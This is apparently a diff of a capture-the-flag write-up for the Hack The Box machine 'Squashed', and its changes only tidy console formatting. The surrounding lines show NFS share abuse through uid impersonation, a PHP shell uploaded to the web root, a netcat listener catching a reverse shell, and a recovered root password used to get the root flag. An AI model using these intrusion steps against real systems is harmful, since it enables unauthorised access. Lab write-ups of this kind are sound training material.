@@ -58,6 +58,8 @@ $ cd  nfs/
 
 Now in my `nfs/` directory:
 ```
+$ tree
+
 .
 ├── html      <-- Cant read here
 └── ross
@@ -158,7 +160,8 @@ gcc test.c -o test
 
 Executing the program (must run with sudo):
 ```console
-$ sudo ./test                                                                              
+$ sudo ./test  
+
 uid=2017(squashed) gid=0(root) groups=0(root)
 total 24
 drwxrwxrwx  5 2017   33  4096 Nov 11 00:50 html
@@ -184,7 +187,8 @@ drwxr-xr-x 2  2017 www-data  4096 Nov 11 00:55 js
 
 In `.htaccess`, I saw that:
 ```console
-$ cat .htaccess                                                                            
+$ cat .htaccess  
+
 AddType application/x-httpd-php .htm .html
 ```
 It means that this web server can run **PHP**.
@@ -201,6 +205,7 @@ Then I navigate to `http://squashed.htb/shell.php`, and I got a shell!
 ```console
 $ nc -lnvp 9999                                                                            
 listening on [any] 9999 ...
+
 connect to [10.10.14.4] from (UNKNOWN) [10.10.11.191] 44896
 Linux squashed.htb 5.4.0-131-generic #147-Ubuntu SMP Fri Oct 14 17:07:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
  06:00:44 up  2:57,  1 user,  load average: 0.00, 0.00, 0.00
@@ -243,7 +248,7 @@ The password of `root` is `cah$mei7rai9A`.
 
 So I authenticated as `root` to get the **root flag**.
 ```console
-su root
+$ su root
 
 Password:
 root@squashed:~#
